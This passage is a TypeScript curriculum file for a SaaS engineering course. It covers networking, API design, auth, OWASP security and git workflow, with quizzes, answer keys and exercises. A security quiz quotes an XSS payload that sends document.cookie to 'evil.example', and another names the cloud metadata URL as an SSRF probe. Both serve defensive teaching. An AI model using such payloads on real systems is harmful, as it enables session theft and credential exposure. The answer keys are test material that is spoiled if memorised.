import type { PhaseMeta } from "@/lib/types";

export const phase: PhaseMeta = {
  id: 0,
  slug: "foundations",
  title: "Engineering Foundations",
  tagline: "Networking, API design, security, and professional workflow",
  objective:
    "Build the professional baseline every later phase assumes: understand what happens on the wire, design APIs other teams can depend on, secure a multi-tenant SaaS by default, and ship through a reviewable, documented workflow.",
  overview:
    "Architecture, performance and scaling all sit on top of a few foundations that self-taught engineers often pick up only by accident: how a request actually travels from browser to database and back, what makes an API contract safe to depend on, how authentication and tenant-scoped authorization really work, and which security mistakes turn a working SaaS into a breach notification. These are the topics that come up in the first week of a professional job and in almost every senior interview, and they are the ones that are most expensive to retrofit.\n\nThis phase comes first because everything later builds on it. The layered architecture of Phase 1 needs to know where authorization checks live. The performance work of Phase 2 needs you to read a network waterfall and tell latency from bandwidth. The scaling work of Phase 3 needs idempotent APIs and sensible timeouts. The delivery pipeline of Phase 4 needs small PRs, branch protection and dependency scanning. Learning them now means you build them in from the start instead of bolting them on.\n\nYou will practice by writing an OpenAPI contract for an invoices API with idempotency and cursor pagination, auditing and fixing a deliberately vulnerable invoice service, designing authentication and tenant isolation for an enterprise ERP, and finally building a hardened invoices API through a real pull-request workflow with branch protection and architecture decision records.",
  lessons: [
    {
      slug: "networking-for-web-engineers",
      title: "Networking for Web Engineers",
      summary:
        "Follow a request through DNS, TCP, TLS and HTTP versions, proxies and CDNs, and learn to debug latency and timeouts with curl, dig and the browser waterfall.",
      minutes: 40,
      keyTakeaways: [
        "A cold HTTPS request pays for DNS, the TCP handshake and the TLS handshake before the first byte: at least three round trips, which is why latency usually matters more than bandwidth.",
        "HTTP/2 multiplexes many requests over one TCP connection; HTTP/3 runs over QUIC on UDP to remove TCP head-of-line blocking and survive network changes.",
        "Connection reuse (keep-alive and pooling) is a large, cheap win, but server idle timeouts must be longer than the load balancer's or you get random 502s.",
        "Every outbound call needs a timeout, timeouts should shrink as you go deeper in the stack, and only idempotent operations should be retried, with backoff and jitter.",
        "Proxies, load balancers and CDNs change what your app sees: trust X-Forwarded-For only from known hops and never cache tenant data as public.",
        "curl -v, curl -w timing fields, dig and the devtools waterfall tell you which phase of a request is slow before you guess.",
      ],
      quiz: [
        {
          question:
            "Users in Singapore report your dashboard takes 4 seconds to load, while users in Frankfurt (where the servers are) see 600 ms. The page makes 8 sequential API calls, each with tiny JSON responses. What is the most effective fix?",
          options: [
            "Upgrade the servers' network bandwidth",
            "Reduce round trips: batch or parallelize the calls (Promise.all or a single aggregate endpoint) and reuse connections",
            "Gzip the JSON responses",
            "Switch the database to a faster instance type",
          ],
          answer: 1,
          explanation:
            "Small responses over a long distance are dominated by round-trip latency, not bandwidth. Eight sequential calls pay the RTT eight times, plus handshakes for any new connections. Parallelizing or batching, plus connection reuse, removes most of that. Bandwidth and compression barely help tiny payloads, and the database is not the bottleneck shown by the geography.",
        },
        {
          question:
            "After moving a Node API behind an AWS Application Load Balancer, about 0.1% of requests fail with 502 under light load, with no errors in the app logs. The ALB idle timeout is 60 s and Node's keepAliveTimeout is the default 5 s. What is happening?",
          options: [
            "The ALB is overloaded and needs more capacity",
            "Node closes idle keep-alive connections before the ALB does, so the ALB occasionally sends a request on a socket Node just closed; set keepAliveTimeout above 60 s (and headersTimeout slightly higher)",
            "TLS certificates are expiring intermittently",
            "Node needs to be upgraded to HTTP/3",
          ],
          answer: 1,
          explanation:
            "The upstream (Node) must keep idle connections open longer than the proxy in front of it. Otherwise there is a race in which the proxy reuses a connection the server is closing, which produces a 502 that never reaches app logs. Raising keepAliveTimeout to about 65 s fixes it.",
        },
        {
          question:
            "Your invoices API calls a tax-rate service. During its outage, every API request hung for 2 minutes and the Node process ran out of sockets. Which change addresses the root cause?",
          options: [
            "Retry the tax call 5 times immediately on failure",
            "Set an explicit timeout on the tax call (for example AbortSignal.timeout(2000)) that is shorter than your own request deadline, and degrade or fail fast",
            "Increase the server's maximum socket count",
            "Move the tax call into the browser",
          ],
          answer: 1,
          explanation:
            "Without a timeout, a slow dependency holds your resources hostage. Timeouts should shrink deeper in the stack so callers can still respond. Immediate retries amplify load on a failing service, and more sockets only delays exhaustion.",
        },
        {
          question:
            "You put a CDN in front of your SaaS and set Cache-Control: public, max-age=300 on GET /api/invoices to cut load. What is the most serious problem?",
          options: [
            "Invoices will be 5 minutes stale",
            "The CDN may serve one tenant's cached invoice list to another tenant, because the response is user-specific but marked as publicly cacheable",
            "CDNs cannot cache JSON",
            "max-age is ignored over HTTP/2",
          ],
          answer: 1,
          explanation:
            "Shared caches key on the URL (plus any Vary headers), not on your session. Marking authenticated, tenant-specific data public turns a performance change into a data leak. Use private or no-store for per-user responses and cache only truly public assets at the CDN.",
        },
        {
          question:
            "A request to your API is slow. curl -w shows time_namelookup 0.002 s, time_connect 0.03 s, time_appconnect 0.07 s, time_starttransfer 1.9 s, time_total 1.95 s. Where should you look first?",
          options: [
            "DNS configuration",
            "The TLS certificate chain",
            "Server-side processing: almost all the time is between the end of the TLS handshake and the first byte (TTFB), so profile the handler and its queries",
            "Response size and bandwidth",
          ],
          answer: 2,
          explanation:
            "The timings are cumulative. DNS, TCP and TLS finish by 70 ms; the jump to 1.9 s before the first byte means the server spent around 1.8 s producing the response. Transfer after the first byte is only 50 ms, so payload size is not the issue.",
        },
      ],
      resources: [
        {
          label: "High Performance Browser Networking (Ilya Grigorik, free online)",
          url: "https://hpbn.co/",
          kind: "book",
        },
        {
          label: "MDN: An overview of HTTP",
          url: "https://developer.mozilla.org/en-US/docs/Web/HTTP",
          kind: "docs",
        },
        {
          label: "Chrome DevTools: Network features reference",
          url: "https://developer.chrome.com/docs/devtools/network/reference",
          kind: "docs",
        },
        {
          label: "Cloudflare Learning Center (DNS, CDN, TLS explainers)",
          url: "https://www.cloudflare.com/learning/",
          kind: "web",
        },
      ],
    },
    {
      slug: "api-design",
      title: "API Design: Resources, Errors, Pagination and Contracts",
      summary:
        "Design HTTP APIs that other teams can safely depend on: resource modeling, status codes, problem-details errors, cursor pagination, idempotency keys, OpenAPI contracts, versioning and webhooks.",
      minutes: 45,
      keyTakeaways: [
        "Model resources and explicit state transitions (POST /invoices/:id/finalize) instead of letting clients PATCH arbitrary status fields.",
        "Use status codes precisely and return every error in one shape, ideally RFC 9457 problem details (application/problem+json).",
        "Cursor (keyset) pagination on a unique, ordered key stays correct and fast as data changes; offset pagination skips or duplicates rows and slows down at depth.",
        "POST is not idempotent, so money-moving creates need an Idempotency-Key that stores and replays the first response and rejects reuse with a different body.",
        "The OpenAPI contract is the product: lint it, diff it in CI, and only make additive changes within a version.",
        "Webhooks are at-least-once: sign them with HMAC over the raw body and a timestamp, and make receivers deduplicate by event id.",
      ],
      quiz: [
        {
          question:
            "A mobile client on a flaky network calls POST /invoices, the request times out, and the client retries. Finance later finds duplicate invoices. What is the correct API-level fix?",
          options: [
            "Tell clients never to retry POST requests",
            "Require an Idempotency-Key header; store the key per tenant with a fingerprint of the request and the first response, and replay that response on retries",
            "Deduplicate invoices nightly with a batch job",
            "Change the endpoint to GET so it is idempotent",
          ],
          answer: 1,
          explanation:
            "Timeouts are ambiguous: the server may have succeeded. An idempotency key lets clients retry safely, and the server returns the original result instead of creating a second invoice. Forbidding retries loses data, nightly cleanup is too late for payments, and GET must not have side effects.",
        },
        {
          question:
            "A client reuses an Idempotency-Key it already used, but with a different amount in the body. How should the server respond?",
          options: [
            "Create a new invoice with the new amount",
            "Replay the original response silently",
            "Reject it with a 4xx problem response (for example 422 or 409) because the key is bound to a different request fingerprint",
            "Return 500",
          ],
          answer: 2,
          explanation:
            "A key identifies one logical operation. Reusing it with a different payload is a client bug, and both silently replaying and creating a new resource hide it. Comparing a stored request fingerprint and rejecting the mismatch makes the bug visible.",
        },
        {
          question:
            "An accountant exports all invoices page by page with ?page=N&pageSize=100 sorted by created_at desc while new invoices are being created. Some invoices appear twice and some never appear. Why, and what fixes it?",
          options: [
            "The database is inconsistent; add a transaction around each page",
            "Offset pagination shifts when rows are inserted ahead of the offset; use cursor pagination on (created_at, id) so each page starts after the last row seen",
            "pageSize is too large; use 10",
            "Sorting must be ascending for pagination to work",
          ],
          answer: 1,
          explanation:
            "Offsets count positions, and positions move when rows are inserted or deleted. A keyset cursor encodes the last seen sort key plus a unique tiebreaker, so the next page is defined by values, not positions. It is also fast at depth because it can use an index.",
        },
        {
          question:
            "You need to rename the field total to totalCents in GET /v1/invoices/:id, which is used by three partner integrations. What is the backward-compatible approach?",
          options: [
            "Rename it in place; partners should read the changelog",
            "Add totalCents alongside total, mark total deprecated in the OpenAPI spec (with Deprecation/Sunset headers), track usage, and remove it only in /v2 or after the sunset date",
            "Return total as a string to signal the change",
            "Create /v1.1 with only the renamed field",
          ],
          answer: 1,
          explanation:
            "Within a version, only additive changes are safe. Adding the new field, deprecating the old one, and removing it in a new major version (or after an announced sunset) keeps existing clients working. A breaking rename in place is exactly what contract diffing in CI should catch.",
        },
        {
          question:
            "User A from tenant Acme requests GET /invoices/inv_123, which exists but belongs to tenant Globex. Which response is best?",
          options: [
            "403 Forbidden with detail 'This invoice belongs to Globex'",
            "404 Not Found, the same as for an id that does not exist",
            "200 with an empty body",
            "401 Unauthorized",
          ],
          answer: 1,
          explanation:
            "Revealing that the id exists in another tenant leaks information and helps enumeration. From Acme's point of view the invoice does not exist, so 404 is accurate. 401 means the caller is not authenticated, which is not the case here.",
        },
      ],
      resources: [
        {
          label: "RFC 9457: Problem Details for HTTP APIs",
          url: "https://www.rfc-editor.org/rfc/rfc9457",
          kind: "docs",
        },
        {
          label: "OpenAPI Specification",
          url: "https://spec.openapis.org/oas/latest.html",
          kind: "docs",
        },
        {
          label: "Google API Design Guide",
          url: "https://cloud.google.com/apis/design",
          kind: "docs",
        },
        {
          label: "Stripe API reference (idempotent requests, pagination, webhooks)",
          url: "https://docs.stripe.com/api",
          kind: "docs",
        },
      ],
    },
    {
      slug: "authentication-authorization",
      title: "Authentication & Authorization for Multi-Tenant SaaS",
      summary:
        "Choose between sessions and JWTs, hash passwords correctly, integrate OAuth2/OIDC and MFA, and enforce RBAC and tenant isolation in the right layers.",
      minutes: 45,
      keyTakeaways: [
        "Authentication proves who the caller is; authorization decides what they may do in this tenant, on this resource, right now. They are separate steps in separate layers.",
        "Server-side sessions in __Host- cookies (HttpOnly, Secure, SameSite) are the safe default for first-party web apps; short-lived JWTs fit service-to-service and API clients but are hard to revoke.",
        "Hash passwords with argon2id (OWASP baseline m=19 MiB, t=2, p=1) or bcrypt with cost 10+, never with fast hashes like SHA-256 or MD5.",
        "For SSO use OIDC authorization code flow with PKCE, validate state, nonce, issuer and audience, identify users by (iss, sub) rather than email, then issue your own session.",
        "Roles belong to a tenant membership, not to the user globally; RBAC covers most SaaS needs and ABAC adds conditions like ownership or amount limits.",
        "Scope every query by tenant from the authenticated context, and add Postgres row-level security as a second line of defense.",
      ],
      quiz: [
        {
          question:
            "Your SPA stores a 30-day JWT in localStorage. A support agent's account is compromised and you disable it, but the attacker keeps using the API for days. What design change fixes both the revocation problem and the theft risk?",
          options: [
            "Make the JWT expire in 7 days instead",
            "Use a server-side session id in an HttpOnly, Secure, SameSite cookie (or short-lived access tokens with revocable refresh tokens), checked against a store you can invalidate",
            "Encrypt the JWT payload",
            "Move the JWT to sessionStorage",
          ],
          answer: 1,
          explanation:
            "A self-contained JWT stays valid until it expires, and localStorage is readable by any XSS. A server-side session (or short access tokens plus revocable refresh tokens) lets you revoke immediately, and an HttpOnly cookie keeps the credential away from JavaScript. Encrypting or shortening the token does not make it revocable.",
        },
        {
          question:
            "Your app supports Sign in with Microsoft for enterprise tenants. The callback looks up the local user by the email claim in the ID token. Why is this dangerous?",
          options: [
            "Emails are case-sensitive",
            "Email is not a stable, verified identifier across issuers; an attacker who controls an identity provider or tenant that can assert that email could take over the account. Link accounts by (iss, sub) and require verified email for linking",
            "ID tokens do not contain email",
            "It is not dangerous as long as you use HTTPS",
          ],
          answer: 1,
          explanation:
            "The stable identity in OIDC is the issuer plus subject. Matching on email alone has caused real account takeovers when a different issuer or a misconfigured multi-tenant app asserted someone else's email. Store (iss, sub) on first link and look users up by it.",
        },
        {
          question:
            "A user belongs to two tenants: admin in Acme and viewer in Globex. Your users table has a single role column set to admin. What goes wrong?",
          options: [
            "Nothing, as long as tenant_id is checked",
            "The user gets admin rights in Globex too, because role is global instead of per tenant membership; store roles on a memberships(user_id, tenant_id, role) table",
            "The user cannot log in to Globex",
            "Only performance is affected",
          ],
          answer: 1,
          explanation:
            "In multi-tenant SaaS, authorization is always relative to a tenant. Roles must live on the membership. A global role column is a classic privilege-escalation bug once users can belong to more than one tenant.",
        },
        {
          question:
            "A developer adds a new reporting query and forgets WHERE tenant_id = $1. Which defense-in-depth measure would still stop the cross-tenant leak?",
          options: [
            "A frontend check that hides other tenants' data",
            "Postgres row-level security policies using a per-transaction tenant setting (set_config('app.tenant_id', ..., true)) with FORCE ROW LEVEL SECURITY, and an app role that is not the table owner or superuser",
            "Rate limiting the reporting endpoint",
            "Using UUIDs instead of integer ids",
          ],
          answer: 1,
          explanation:
            "RLS makes the database filter rows even when application code forgets to. It only works if the app connects as a role that does not bypass RLS and the tenant setting is scoped to the transaction, so pooled connections cannot carry another tenant's value. UUIDs make guessing harder but do not enforce anything.",
        },
        {
          question:
            "Where should the rule 'only users with the approver role may finalize invoices over 10,000 EUR' be enforced in a layered architecture?",
          options: [
            "In the React component that shows the Finalize button",
            "In the FinalizeInvoice use case (application layer), using the authenticated principal and the loaded invoice, with the UI only hiding the button as a convenience",
            "In an nginx rule",
            "In the database trigger only",
          ],
          answer: 1,
          explanation:
            "The decision needs both the principal and resource attributes (the amount), and must apply to every entry point: UI, API and imports. The use case is the single place all of them go through. UI checks are for usability, and the HTTP layer only knows who the caller is, not the invoice amount.",
        },
      ],
      resources: [
        {
          label: "OWASP Authentication Cheat Sheet",
          url: "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
          kind: "docs",
        },
        {
          label: "OWASP Password Storage Cheat Sheet",
          url: "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html",
          kind: "docs",
        },
        {
          label: "OpenID Connect specifications",
          url: "https://openid.net/developers/specs/",
          kind: "docs",
        },
        {
          label: "PostgreSQL: Row Security Policies",
          url: "https://www.postgresql.org/docs/current/ddl-rowsecurity.html",
          kind: "docs",
        },
      ],
    },
    {
      slug: "application-security",
      title: "Application Security: OWASP Top 10 for a SaaS",
      summary:
        "Recognize and fix the vulnerabilities that actually breach SaaS products, from IDOR and injection to SSRF, misconfigured headers, leaked secrets and vulnerable dependencies.",
      minutes: 50,
      keyTakeaways: [
        "Broken access control (IDOR, mass assignment, missing role checks) is the most common serious flaw; scope every lookup by tenant and allow-list writable fields.",
        "Never build SQL, HTML or URLs by string concatenation from input: use parameterized queries, context-aware escaping and allow-lists.",
        "Validate every input at the boundary with a strict schema (zod) and treat anything not explicitly allowed as an error.",
        "Secure defaults are configuration: CSP, HSTS and other headers via helmet, generic error responses, SameSite cookies, and rate limits on auth and expensive endpoints.",
        "Secrets live in a secret manager or environment, are validated at startup and are rotated; dependencies are scanned continuously with npm audit and Dependabot.",
        "Log enough to investigate an incident, but redact passwords, tokens and PII by default.",
      ],
      quiz: [
        {
          question:
            "GET /api/invoices/:id loads the invoice with SELECT * FROM invoices WHERE id = $1 and checks only that the user is logged in. A customer changes the id in the URL and sees another company's invoice. What is the vulnerability and fix?",
          options: [
            "SQL injection; escape the id",
            "IDOR (broken access control); scope the query by the tenant from the authenticated session (WHERE id = $1 AND tenant_id = $2) and return 404 when no row matches",
            "XSS; encode the output",
            "CSRF; add a token",
          ],
          answer: 1,
          explanation:
            "The query is parameterized, so it is not injection. The bug is that authorization is missing: any authenticated user can read any id. The fix is to bind every lookup to the caller's tenant (and role where needed). Random ids slow enumeration but do not fix authorization.",
        },
        {
          question:
            "PATCH /api/users/me does UPDATE users SET ... with every key from req.body. A user sends {\"role\": \"owner\", \"tenantId\": \"other\"}. Which fix is most robust?",
          options: [
            "Delete role and tenantId from req.body before the update",
            "Parse the body with a strict zod schema that allow-lists only the editable fields (for example name and locale) and rejects unknown keys",
            "Hide those fields in the UI",
            "Add a database trigger that logs changes",
          ],
          answer: 1,
          explanation:
            "A deny-list breaks the next time someone adds a sensitive column. An allow-list schema means only explicitly editable fields can ever reach the update, and strict mode surfaces unexpected input instead of silently dropping it.",
        },
        {
          question:
            "Your ERP lets tenants set a 'logo URL' that the server downloads to generate PDF invoices. A tester sets it to http://169.254.169.254/latest/meta-data/. What class of bug is this and what is the core defense?",
          options: [
            "XSS; sanitize the URL string",
            "SSRF; restrict scheme and port, resolve the hostname and block private, loopback and link-local ranges (or use an egress proxy allow-list), and disable redirects",
            "CSRF; require a token",
            "Open redirect; validate the Referer header",
          ],
          answer: 1,
          explanation:
            "Server-side request forgery makes your server fetch internal URLs, such as the cloud metadata service that can leak credentials. Defenses operate on the resolved destination, not the string, and an egress allow-list is the strongest option.",
        },
        {
          question:
            "Invoice notes are rendered in the admin panel with dangerouslySetInnerHTML so that line breaks show. A customer saves <img src=x onerror=fetch('https://evil.example/?c='+document.cookie)>. Which combination of fixes is best?",
          options: [
            "Strip the word 'script' from notes on save",
            "Render notes as text (CSS white-space: pre-line) or sanitize with DOMPurify if HTML is truly needed, keep session cookies HttpOnly, and add a Content Security Policy as defense in depth",
            "Base64-encode the notes in the database",
            "Only allow admins to view notes",
          ],
          answer: 1,
          explanation:
            "Keyword filters are trivially bypassed, as this payload shows. Output encoding (React's default text rendering) or a real sanitizer removes the vulnerability. HttpOnly cookies and CSP limit the damage if something slips through.",
        },
        {
          question:
            "Your error handler returns err.message and err.stack in the JSON response so the frontend team can debug. Why is this a security issue, and what should you do instead?",
          options: [
            "It is fine in production as long as HTTPS is used",
            "Stack traces and database errors reveal file paths, library versions, table names and sometimes data; return a generic problem-details body with a correlation id and log the full error server-side",
            "It slows down responses",
            "It only matters for 404 errors",
          ],
          answer: 1,
          explanation:
            "Verbose errors are security misconfiguration: they give attackers a map of your system and feedback for injection attempts. A correlation id lets support find the full error in your logs without exposing it to the client.",
        },
      ],
      resources: [
        {
          label: "OWASP Top 10",
          url: "https://owasp.org/www-project-top-ten/",
          kind: "web",
        },
        {
          label: "OWASP Cheat Sheet Series",
          url: "https://cheatsheetseries.owasp.org/",
          kind: "docs",
        },
        {
          label: "MDN: Content Security Policy (CSP)",
          url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
          kind: "docs",
        },
        {
          label: "PortSwigger Web Security Academy (free hands-on labs)",
          url: "https://portswigger.net/web-security",
          kind: "interactive",
        },
      ],
    },
    {
      slug: "git-code-review-design-docs",
      title: "Git Workflow, Code Review & Design Docs",
      summary:
        "Work like a professional team: trunk-based development with small PRs, clean history, effective code review, branch protection, ADRs and lightweight design docs.",
      minutes: 35,
      keyTakeaways: [
        "Trunk-based development with short-lived branches and feature flags beats long-lived git-flow branches for SaaS teams that deploy continuously.",
        "Small PRs (roughly under 400 changed lines) get faster, better reviews; split large work into stacked or sequential PRs.",
        "Commits and PR descriptions explain why, not just what; a reviewer should understand context, risk and how to test without asking.",
        "Review for design, correctness, security and tests first, style last (automate style with linters), and label comments by severity.",
        "Branch protection or rulesets on main (required reviews, required status checks, no force pushes) make the process enforceable rather than optional.",
        "Record significant decisions in short ADRs (context, decision, consequences) and use a one-to-three page design doc before building anything that is hard to reverse.",
      ],
      quiz: [
        {
          question:
            "Your team keeps a develop branch and feature branches that live 3 to 6 weeks. Merges regularly take a day of conflict resolution and releases are risky. Which change most directly addresses this?",
          options: [
            "Add a release branch per sprint",
            "Move to trunk-based development: branches that live a day or two, merged to main behind feature flags, with CI on every PR",
            "Require two approvals per PR instead of one",
            "Squash all commits before merging",
          ],
          answer: 1,
          explanation:
            "Conflict pain grows with branch lifetime. Short-lived branches integrate continuously, and feature flags decouple deploying code from releasing features. More approvals or squashing do not change how far branches drift.",
        },
        {
          question:
            "A teammate opens a 2,800-line PR titled 'invoices work' that adds a migration, refactors the repository layer and adds a new endpoint. What is the most useful review response?",
          options: [
            "Approve it to avoid blocking them",
            "Skim it and leave style nits",
            "Ask to split it into reviewable PRs (for example migration, repository refactor, endpoint) with descriptions of why, risk and how to test, and offer to pair on the split",
            "Rewrite it yourself",
          ],
          answer: 2,
          explanation:
            "Large PRs get superficial reviews, so defects slip through. Splitting by concern lets each change be reviewed properly and reverted independently. Offering help keeps the tone collaborative.",
        },
        {
          question:
            "You rebased your feature branch onto main and need to update the remote branch that a colleague might also have pushed to. Which command is safest?",
          options: [
            "git push --force",
            "git push --force-with-lease",
            "git push --no-verify",
            "Delete the remote branch and push again",
          ],
          answer: 1,
          explanation:
            "--force-with-lease refuses to overwrite the remote if it has commits you have not seen, so you do not silently destroy a colleague's work. Plain --force overwrites unconditionally, and --no-verify only skips local hooks.",
        },
        {
          question:
            "Six months ago the team chose Postgres row-level security for tenant isolation. A new senior engineer proposes removing it because 'nobody knows why we did this'. What artifact should have prevented this debate?",
          options: [
            "A long comment in the migration file",
            "An ADR recording the context, the decision, the alternatives considered and the consequences, linked from the README",
            "A Slack thread",
            "A Jira ticket",
          ],
          answer: 1,
          explanation:
            "ADRs capture why a decision was made in a place that lives with the code and is easy to find. The newcomer can then argue with the original reasoning, or supersede it with a new ADR if the context has changed.",
        },
        {
          question:
            "Your team agrees PRs need CI to pass and one approval, but people still merge red builds 'just this once' at night. What makes the agreement real?",
          options: [
            "A reminder in the team channel",
            "Branch protection or a ruleset on main requiring the CI status checks and an approval, blocking force pushes, and applying to admins too",
            "A CONTRIBUTING.md file",
            "Removing everyone's write access",
          ],
          answer: 1,
          explanation:
            "Process that relies on memory erodes under pressure. Branch protection enforces the rules mechanically while still allowing normal work, and including admins removes the exception path.",
        },
      ],
      resources: [
        {
          label: "Google Engineering Practices: Code Review",
          url: "https://google.github.io/eng-practices/",
          kind: "docs",
        },
        {
          label: "Trunk Based Development",
          url: "https://trunkbaseddevelopment.com/",
          kind: "web",
        },
        {
          label: "Architecture Decision Records (adr.github.io)",
          url: "https://adr.github.io/",
          kind: "web",
        },
        {
          label: "Pro Git (free book)",
          url: "https://git-scm.com/book/en/v2",
          kind: "book",
        },
      ],
    },
  ],
  problems: [
    {
      slug: "api-contract-design",
      title: "Invoices API: Contract First",
      kind: "exercise",
      summary:
        "Write an OpenAPI 3.1 contract for a versioned invoices API with idempotent creation, cursor pagination, filters and problem-details errors, then implement it in Node/TypeScript with tests that prove idempotency and pagination correctness.",
      estimatedHours: 10,
      needsDiagram: false,
      requirements: [
        "An openapi.yaml (OpenAPI 3.1) defines POST /v1/invoices, GET /v1/invoices and GET /v1/invoices/{id}, with reusable schemas and an application/problem+json Problem schema used by every 4xx/5xx response.",
        "The contract passes Spectral lint with zero errors, and CI fails if it stops passing.",
        "POST /v1/invoices requires an Idempotency-Key header (missing key returns 400); a retry with the same key and body returns the identical status and body without creating a second row; the same key with a different body returns 422.",
        "Ten concurrent requests with the same Idempotency-Key and body create exactly one invoice, proven by an automated test.",
        "GET /v1/invoices uses opaque cursor pagination over (created_at, id) with limit defaulting to 20 and capped at 100, and supports filters status, customerId and createdFrom/createdTo.",
        "A test that paginates 250 seeded invoices (including rows with identical created_at) while inserting new ones returns every pre-existing invoice exactly once.",
        "Responses are validated against the contract in tests (for example with an OpenAPI response validator), and invalid query parameters return 400 problem details listing the offending fields.",
        "All data is tenant-scoped: an invoice id from another tenant returns 404.",
      ],
      hints: [
        "Write the contract before any code. Start with the Invoice, InvoiceCreate, InvoicePage and Problem schemas, then the paths. Ask yourself what a client needs to retry safely and to page through everything.",
        "For idempotency, create a table keyed by (tenant_id, idempotency_key) with a request hash, status and stored response. Claim the key with INSERT ... ON CONFLICT DO NOTHING inside the same transaction that creates the invoice.",
        "The cursor is base64url of JSON like {\"t\":\"2026-01-05T10:00:00.123Z\",\"id\":\"inv_...\"}. The next-page query is WHERE (created_at, id) < ($1, $2) ORDER BY created_at DESC, id DESC LIMIT limit + 1.",
        "Fetch limit + 1 rows: if you get the extra row, there is a next page and nextCursor comes from the last row you return, not the extra one.",
        "Use a real Postgres in tests (docker compose or Testcontainers). Concurrency bugs in idempotency do not show up against in-memory fakes.",
      ],
      rubric: [
        "Could a frontend team build against your openapi.yaml alone, without reading your code?",
        "Does every error response, including validation and 500s, use the same problem-details shape and content type?",
        "Does your idempotency test actually run requests concurrently, and would it fail if you removed the unique constraint?",
        "Would your pagination test fail if you removed the id tiebreaker from the cursor?",
        "Is there any query path where tenant_id comes from the request body or URL instead of the authenticated context?",
      ],
      stretchGoals: [
        "Add oasdiff to CI so a breaking change to openapi.yaml fails the build unless the version is bumped.",
        "Generate a typed client from the contract (openapi-typescript) and use it in your integration tests.",
        "Add a webhook invoice.created with an HMAC-SHA256 signature and a receiver test that rejects tampered or replayed payloads.",
        "Expire idempotency records after 24 hours with a scheduled cleanup and document the behavior in the contract.",
      ],
      repoChecklist: [
        "openapi.yaml at the repo root plus a rendered docs page or instructions to view it (Redocly, Scalar or Swagger UI)",
        "README with setup, run and test commands and a short section explaining the idempotency and pagination design",
        "SQL migrations including the idempotency table and the pagination index",
        "Integration tests for idempotency (including concurrency), pagination, filters, tenant isolation and contract conformance, runnable with one npm script",
        "CI workflow running lint (Spectral), typecheck and tests",
      ],
      relatedLessons: ["api-design", "networking-for-web-engineers", "authentication-authorization"],
    },
    {
      slug: "security-audit",
      title: "Security Audit: Break and Fix an Invoice Service",
      kind: "exercise",
      summary:
        "Audit a deliberately vulnerable Express and Postgres invoice service, document every finding with severity in a security report, fix each one, and add regression tests that prove the fixes.",
      estimatedHours: 10,
      needsDiagram: false,
      requirements: [
        "SECURITY_REPORT.md lists at least 8 distinct findings, each with location (file and route), severity (Critical/High/Medium/Low), impact, proof-of-concept request, fix and the regression test that covers it.",
        "Every finding has a working exploit reproduced against the original code (a curl command or a failing test written before the fix).",
        "All SQL uses parameterized queries; any dynamic ORDER BY or column choice goes through an allow-list.",
        "Passwords are hashed with argon2id or bcrypt (cost 10+), and existing MD5 hashes are upgraded on next successful login.",
        "No secrets remain in source code; configuration is loaded from the environment and validated at startup, failing fast when missing.",
        "Login is rate limited (for example 5 attempts per 15 minutes per IP and account), proven by a test that receives 429.",
        "At least one regression test per finding (supertest + Vitest against a real test database), all failing on the original code and passing on the fixed code.",
        "500 responses return a generic problem-details body with a correlation id and no stack trace, SQL or request data.",
      ],
      hints: [
        "Read the code route by route and for each one ask: who can call this, which tenant's data can it touch, which input reaches SQL, HTML or a log, and what comes back in the response.",
        "Write the exploit as a failing test first. That gives you proof for the report and a regression test for free.",
        "IDOR and mass assignment are fixed by the same habit: tenant id comes only from the verified token, and writable fields come only from an allow-list schema.",
        "For the stored XSS, check both fields rendered into the HTML view, and add a Content-Security-Policy header as defense in depth, not as the fix.",
        "Count your findings against the categories in the application-security lesson. If you have fewer than 8, look again at authentication, logging, error handling and configuration.",
      ],
      rubric: [
        "Would a reviewer who has never seen the code understand each finding's impact and reproduce it from your report alone?",
        "Do your severities reflect real impact (cross-tenant data access is worse than a missing header)?",
        "Does each regression test fail against the original code?",
        "Did you fix root causes (tenant scoping, allow-lists, parameterization) rather than patching individual payloads?",
        "Is there anything in logs or error responses that could still leak credentials or PII?",
      ],
      stretchGoals: [
        "Add a CI job running npm audit (high and above), a secret scanner such as gitleaks, and Semgrep or CodeQL on every PR.",
        "Add Postgres row-level security as a second layer behind application tenant scoping, with a test that proves it blocks a deliberately unscoped query.",
        "Run OWASP ZAP baseline against the fixed service and document any remaining findings.",
      ],
      repoChecklist: [
        "The original vulnerable code preserved in the first commit or a tagged release (vulnerable-baseline) so fixes can be diffed",
        "SECURITY_REPORT.md with a summary table and one section per finding",
        "One commit or PR per fix, referencing the finding id",
        "Regression test suite runnable with one npm script against a docker compose Postgres",
        ".env.example with every required variable and no real secrets",
      ],
      relatedLessons: ["application-security", "authentication-authorization", "api-design"],
    },
    {
      slug: "auth-tenant-isolation-design",
      title: "Design: AuthN, AuthZ and Tenant Isolation for an ERP",
      kind: "design",
      summary:
        "Design authentication, per-tenant RBAC, enterprise SSO, service-to-service auth and defense-in-depth tenant isolation for a multi-tenant ERP, and defend it in a diagram and DESIGN.md.",
      estimatedHours: 8,
      needsDiagram: true,
      designPrompt:
        "Draw the request path from browser and from an API client to the data. Boxes: browser, enterprise IdP (OIDC/SAML), your auth service or login module, API gateway or edge, the ERP application services (at least invoicing and inventory), a background worker, the session or token store, the policy/authorization component, and Postgres with RLS. Arrows must show: the OIDC authorization code + PKCE login with tenant-to-IdP discovery, issuing the session cookie, a normal authenticated request carrying tenant context, where the role/permission check happens, how tenant id reaches the database (and RLS), service-to-service calls with their own credentials, and a worker job carrying tenant context. Mark each trust boundary and label which component makes each authorization decision.",
      requirements: [
        "DESIGN.md states the threat model: at least 5 concrete threats (for example cross-tenant read via IDOR, stolen session, compromised IdP of one tenant, malicious insider in support, leaked service credential) and the control that addresses each.",
        "Login supports local accounts with password + MFA and per-tenant enterprise SSO via OIDC, including how the tenant's IdP is discovered (email domain or tenant subdomain) and how JIT provisioning and deprovisioning (SCIM or IdP-driven) work.",
        "A permission model is defined: permissions, at least 4 built-in roles per tenant, custom roles, and a memberships table so one user can hold different roles in different tenants; schema included.",
        "Tenant isolation has at least 3 independent layers (for example tenant from session only, repository scoping, Postgres RLS), and the document explains what happens if each one fails.",
        "Service-to-service and worker authentication are specified (for example short-lived signed tokens or mTLS), including how tenant context is propagated and verified.",
        "Session and token lifetimes, revocation (user removed from tenant, password reset, IdP disabled) and the expected time for revocation to take effect are stated with numbers.",
        "Support/admin impersonation is designed with explicit consent or approval, time limits and audit logging.",
      ],
      hints: [
